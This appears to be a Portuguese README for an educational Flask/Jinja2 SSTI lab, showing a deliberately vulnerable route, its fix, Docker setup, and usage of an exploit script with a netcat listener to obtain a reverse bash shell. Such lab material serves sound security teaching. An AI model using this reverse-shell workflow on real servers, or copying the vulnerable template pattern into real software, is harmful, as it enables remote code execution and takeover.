# Laboratório de Exploração de SSTI em Flask/Jinja2

Este repositório contém um laboratório de Docker vulnerável e um script de exploração (PoC) para demonstrar a Execução Remota de Código (RCE) através de uma vulnerabilidade de **Server-Side Template Injection (SSTI)**.

O objetivo é educacional, mostrando como uma configuração insegura em uma aplicação web moderna (Python/Flask) pode levar ao controle total do servidor.

---

## ⚠️ AVISO LEGAL DE USO

**Este projeto é estritamente para fins educacionais e de pesquisa em cibersegurança.**

Não me responsabilizo pelo mau uso de qualquer informação aqui contida. O uso de ferramentas para atacar alvos sem autorização prévia é ilegal. **Use apenas em ambientes de laboratório controlados.**

---

## 🔬 A Vulnerabilidade: SSTI (Server-Side Template Injection)

A vulnerabilidade se encontra no arquivo `app.py`, especificamente na rota `/vuln`. Quando o `render_template_string()` é usado com dados não-sanitizados (como a entrada do usuário), o engine **Jinja2** executa qualquer expressão encontrada (ex: `{{ 7*7 }}`), o que abre a porta para o RCE.

### O Código Inseguro (`/vuln`)

O `name` (controlado pelo usuário) é concatenado diretamente na string que será renderizada.

```python
@app.route('/vuln')
def vuln():
    name = request.args.get('name', 'Guest')
    # ERRO: Aqui a entrada do usuário é concatenada diretamente na string que será renderizada
    html = f"<h1>Bem-vindo, {name}!</h1>"
    return render_template_string(html)
```

### A Correção (Código Seguro em `/safe`)

A forma correta é usar `render_template()` e passar a entrada do usuário como uma **variável de dados**. Isso garante que o Jinja2 trate a entrada como texto, e não como código executável.

```python
@app.route('/safe')
def safe():
    name = request.args.get('name', 'Guest')
    # CORRETO: A entrada do usuário é passada como uma variável de dados para o template.
    return render_template('safe.html', user_name=name)
```

---

## 🛠️ Como Usar o Laboratório (Setup)

1.  **Construa a Imagem Docker:**
    ```bash
    docker build -t ssti-lab .
    ```

2.  **Execute o Contêiner:**
    ```bash
    # Anexa a porta 5000 a todas as interfaces (0.0.0.0)
    docker run -d -p 0.0.0.0:5000:5000 --rm --name ssti-lab ssti-lab
    ```

3.  **Verifique a Vulnerabilidade:**
    Acesse no seu navegador para confirmar que o cálculo (`7*7`) é executado:
    `http://<IP_DO_DOCKER>:5000/vuln?name={{7*7}}`

    O resultado esperado é "Bem-vindo, 49!":

    <img width="241" height="80" alt="image" src="https://github.com/user-attachments/assets/3fa2b1f2-13c9-402a-b685-e2ef6480704a" />

---

## 💥 Exploração (PoC - RCE)

O script `exploit-ssti.py` automatiza a exploração desta falha para obter um *shell* reverso.

### Como Usar o Exploit

1.  **Inicie seu Listener (Netcat):**
    (Na sua máquina de ataque)
    ```bash
    nc -nlvp 4444
    ```

2.  **Execute o Script de Exploit:**
    (Informe o IP/Porta do alvo e o IP/Porta do seu listener)
    ```bash
    python3 exploit-ssti.py <RHOST> <RPORT> <LHOST> <LPORT>

    # Exemplo:
    python3 exploit-ssti.py 192.168.0.19 5000 192.168.0.14 4444
    ```

### Resultado (Shell Reverso)

O script envia um *payload* SSTI codificado via URL, forçando o servidor a executar um *shell* reverso em `bash` e se conectar de volta ao seu *listener*.

![Imagem do WhatsApp de 2025-11-04 à(s) 22 38 55_fcc7cc50](https://github.com/user-attachments/assets/3334e084-329e-4ec2-b66a-970c0ba799b6)

![Imagem do WhatsApp de 2025-11-04 à(s) 22 32 32_39b6b473](https://github.com/user-attachments/assets/fa1ac2e5-3393-4cb2-b006-c17094024bf7)
